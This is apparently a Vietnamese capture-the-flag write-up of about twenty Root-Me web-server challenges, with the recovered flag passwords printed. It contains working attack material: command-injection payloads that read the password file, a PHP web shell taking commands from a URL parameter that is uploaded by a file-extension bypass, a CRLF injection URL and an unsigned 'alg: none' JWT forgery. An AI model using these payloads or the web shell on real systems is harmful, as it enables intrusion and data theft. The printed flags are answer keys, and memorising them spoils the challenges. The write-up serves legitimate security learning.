# WEB_SERVER
## 1. HTML - Code source
- Bài này thì y như tên gọi chỉ cần bật source code lên xem là được.    
![Screenshot 2022-04-12 172316](https://i.imgur.com/4xdk2Mt.png)
## 2. HTTP - Contournement de filtrage IP
- Bài này yêu cầu truy cập vào mạng nội bộ bằng địa chỉ ip riêng khi kết nối vào mạng nội bộ của công ty.
- Ở đây dùng http header để kết nối vào
```
X-Forwarded-For: 192.168.0.1
``` 
![Screenshot 2022-04-12 173840](https://i.imgur.com/DrYXKX8.png)
- Send và mật khẩu được trả về thành công
```
Well done, the validation password is: Ip_$po0Fing 
```

## 3. HTTP - Open redirect
- Theo như tên đề bài thì ta cần phải chuyển hướng tới 1 trang web nào đó cụ thể là https://google.com
![Screenshot 2022-04-12 174216](https://i.imgur.com/E8Ybhmt.png)
- Nhìn thấy thẻ a thì có truyền vào tham số h, để ý kĩ thì có 32 kí tự chắc là tên miền được mã hóa md5. Encode thì đúng. Vậy chỉ cần encode https://google.com là ra kết quả.
![Screenshot 2022-04-12 174555](https://i.imgur.com/uxQwvDs.png)
![Screenshot 2022-04-12 174611](https://i.imgur.com/20rZJYo.png)

## 4. HTTP - User-agent
- Thì bài này ngay khi truy cập đã nhận được tin này
```
Wrong user-agent: you are not the "admin" browser!
```
- Rất dễ thấy user-agent là thông tin về browser của mình chỉ cần cho nó là admin thì thành công.
![Screenshot 2022-04-12 175110](https://i.imgur.com/P1wrFCz.png)
![Screenshot 2022-04-12 175122](https://i.imgur.com/8O6J1ZK.png)

## 5. Weak password
- Theo như đúng tên đề bài thì bài này nói về mật khẩu rất yếu thì cứ admin, admin ai ngờ thành công
```
pass = admin
```
## 6. PHP - Injection de commande
- Lời gợi ý thì mật khẩu nằm trong file index.php. Nên chắc phải mở được file đó ra xem.
- Trang web cho mình một form input với gợi ý là địa chỉ local. Nhập thì thấy có vẻ input gọi hàm shell_exec(ping).
![Screenshot 2022-04-12 180112](https://i.imgur.com/HmVSxxO.png)
- Vì hàm shell_exec() là hàm dễ bị khai thác nên có thể tìm kiếm, đọc file.
- Đầu tiên thì liệt kê danh sách các file ra xem thì có file index.php sau đó đọc file. 
```
payload = 127.0.0.1; ls 
payload = 127.0.0.1; cat index.php
```
- Ta tìm được source code 
```php
<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
- Thì flag nằm trong file .passwd chỉ cần đọc file đó lên là thành công.
payload: 127.0.0.1; cat .passwd
```
![Screenshot 2022-04-12 180948](https://i.imgur.com/xLNP8x9.png)

## 7. Backup file
- Đề bài yêu cầu cần tìm được file backup và thử thì tồn tại file index.php.
- Thường thì extension file backup sẽ là  .BAK, .TMP, .GHO , ~
- Thử lần lượt thì ~ là chuẩn và đã tải được file index.php về.
- Bây giờ chỉ cần mở lên rồi đọc password là thành công

```php
$username="ch11";
$password="OCCY9AcNm1tj";


echo '
      <html>
      <body>
	<h1>Authentication v 0.00</h1>
';

if ($_POST["username"]!="" && $_POST["password"]!=""){
    if ($_POST["username"]==$user && $_POST["password"]==$password)
    {
      print("<h2>Welcome back {$row['username']} !</h2>");
      print("<h3>Your informations :</h3><p>- username : $row[username]</p><br />");
      print("To validate the challenge use this password</b>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");

    }
}

echo '
	<form action="" method="post">
	  Login&nbsp;<br/>
	  <input type="text" name="username" /><br/><br/>
	  Password&nbsp;<br/>
	  <input type="password" name="password" /><br/><br/>
	  <br/><br/>
	  <input type="submit" value="connect" /><br/><br/>
	</form>
      </body>
      </html>
';

?> 

```
## 8. HTTP - Directory indexing
- Xem source code thì thấy có directory 
```
<!-- include("admin/pass.html") -->
```
- Vô path admin rồi đọc file admin là có password
```js
Password: Linux
```

## 9. HTTP - Headers
- Bài này về HTTP headers vô phần network xem request thì thấy phần response có phần Header-RootMe-Admin: none mà phần request không có.
- Thêm trường Header-RootMe-Admin: none vô request là có password
![Screenshot 2022-05-13 092627](https://i.imgur.com/5lEpJ2S.png)
![Screenshot 2022-05-13 092647](https://i.imgur.com/wAdanDO.png)
```js
Password: HeadersMayBeUseful 
```
## 10. HTTP - Headers
- Bài này chỉnh sửa về post, thì vô phần network và click thì có request post với scores không đủ để win game. Sửa scores rồi post lại là có password
![Screenshot 2022-05-13 093131](https://i.imgur.com/R2pxii4.png)  

![Screenshot 2022-05-13 093203](https://i.imgur.com/HlVhRMj.png)

![Screenshot 2022-05-13 093221](https://i.imgur.com/hk6AGUF.png)

```js
Password: H7tp_h4s_N0_s3Cr37S_F0r_y0U 
```
## 11. HTTP - Invalid redirect
- Đề gợi ý là chuyển hướng tới file index.php bật burpsuite và bắt request đổi hướng là có password
![Screenshot 2022-05-13 094054](https://i.imgur.com/ksqV8F8.png)
```js
Password: ExecutionAfterRedirectIsBad
```

## 12. HTTP - Verb tampering
- Bài này yêu cầu cần thay đổi phương thức request thì chỉ cần thử lần lượt GET, POST, PUT,...
![Screenshot 2022-05-13 095036](https://i.imgur.com/9huW9UI.png)
- Ở đây thử PUT và đã thành công
```js
Password: a23e$dme96d3saez$$prap
```

## 13. Install files
- Bài này guessing một chút vô soure thì có path dẫn /phpbb và xem tiêu đề bài thì vô /phpbb/install rồi đọc file php ra password
![Screenshot 2022-05-13 095553](https://i.imgur.com/FvHNWFW.png)

```js
Password: karambar
```
## 14. CRLF
- CRLF là viết tắt của Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D (13 trong hệ thập phân) và 0x0A (10 trong hệ thập phân)
- CRLF Injection là một lỗ hổng có thể xảy ra khi người lập trình không kiểm tra kĩ càng dữ liệu người dùng đẩy lên và cho phép người dùng chèn cả các kí tự CR và LF này vào.
- Bài này cần bypass được log là cần hiển thị được trường admin "authenticated." nhưng khi điền thì tất cả input đề false nên cần inject CRLF để tạo dòng mới.
- Payload url
```js
http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0D%0Aa&password=admin
```
```js
Password: rFSP&G0p&5uAg1%
```
## 15. File upload - Double extensions
- Bài này lỗ hổng về file upload. Tạo một file php chứa mã độc thực hiện lệnh systerm.
```php
<?php
    if(isset($_GET['c'])){
        $shell = system($_GET['c']);
        echo $shell;
    }
?>
```
- Vì phần upload hạn chế đuôi .php nên chuyển thành .php.jpg là bypass.
- Up lên và thực hiện lệnh thôi. Password nằm ở đây
```js
test.php.jpg?c=cat ../../../.passwd
```

```js
Password: Gg9LRz-hWSxqqUKd77-_q-6G8
```
## 16. File upload - MIME type
- Bài này làm giống như bài trên nhưng bị từ chối không thực thi lệnh php ở jpg nên cần upload thẳng file php lên.
- Nhưng khi đó cần phải thay đổi trường MINE type sang image/png để có thể upload được lên.
- Sửa trường Content-type: image/png là up được php lên
![Screenshot 2022-05-13 104630](https://i.imgur.com/xJvoHXF.png)
- Bây giờ đọc file .passwd là thành công.
![Screenshot 2022-05-13 104714](https://i.imgur.com/wKyiFPr.png)

```js
Password: a7n4nizpgQgnPERy89uanf6T4
```

## 17. HTTP - Cookies
- Ban đầu cho một input thì nhập admin vào nhưng nhập gì cũng chỉ là user bình thường.
- Vô phần request xem thì mặc định cookie là user nên chỉ cần thay đổi thành admin là thành công
![Screenshot 2022-05-13 104929](https://i.imgur.com/JHwAFiG.png)
![Screenshot 2022-05-13 105200](https://i.imgur.com/CTD3ekr.png)
![Screenshot 2022-05-13 105225](https://i.imgur.com/THOInJj.png)

```js
Password: ml-SYMPA 
```
## 18. Insecure Code Management
- Bài này về quản lý code không an toàn nên nói về quản lý code thì phải có file .git
- Tải file về rồi check file git lên là có pass
```js
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

    blue team want sha256!!!!!!!!!

diff --git a/config.php b/config.php
index e11aad2..663fe35 100644
--- a/config.php
+++ b/config.php
@@ -1,3 +1,3 @@
 <?php
        $username = "admin";
-       $password = "s3cureP@ssw0rd";
+       $password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
diff --git a/index.php b/index.php
index f7237d0..2e620c1 100755
--- a/index.php
+++ b/index.php
@@ -13,7 +13,7 @@
                <?php
                        include('./config.php');
                        if(isset($_POST['username']) && isset($_POST['password'])){
-                               if ($_POST['username'] == $username && md5($_POST['password']) == md5($password)){
+                               if ($_POST['username'] == $username && hash('sha256', $_POST['password']) == $password){
                                        echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
                                        echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
                                }
```
```js
Password: s3cureP@ssw0rd
```

## 20. JSON Web Token (JWT) - Introduction
- Bài này có trường đăng nhập bằng guess và cấp cho cookie là jwt.
- Phân tích thì nhận được
![Screenshot 2022-05-13 113113](https://i.imgur.com/UsBdH49.png)
![Screenshot 2022-05-13 113245](https://i.imgur.com/3kgP5h7.png)
- Chuyển username thành admin và không cần chế độ mã hóa alg là none rồi đổi cookie lại là xong
```js
{
  "typ": "JWT",
  "alg": "none"
}
{
  "username": "guest"
}

ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0=
ewogICJ1c2VybmFtZSI6ICJndWVzdCIKfQ==
=> Cookie: jwt= ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJndWVzdCIKfQ==

```
![Screenshot 2022-05-13 113700](https://i.imgur.com/2kZiDUr.png)
```js
Password: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```



